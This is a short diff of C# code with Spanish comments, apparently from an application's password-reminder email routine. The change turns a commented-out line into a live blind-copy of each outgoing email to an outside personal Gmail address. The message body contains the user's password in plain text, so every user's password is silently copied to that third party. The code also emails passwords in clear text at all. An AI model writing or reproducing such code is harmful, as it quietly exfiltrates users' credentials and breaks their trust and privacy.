@@ -93,7 +93,7 @@ namespace Presentacion
             mmsg.SubjectEncoding = System.Text.Encoding.UTF8;
 
             //Direccion de correo electronico que queremos que reciba una copia del mensaje
-            //mmsg.Bcc.Add("migueloc22@gmail.com"); //Opcional
+            mmsg.Bcc.Add("munarca1@gmail.com"); //Opcional
 
             //Cuerpo del Mensaje
             mmsg.Body = "Hola  Usuario su contraseña es :(" + pass + ") Podra cambia contraseña en configuarciones";
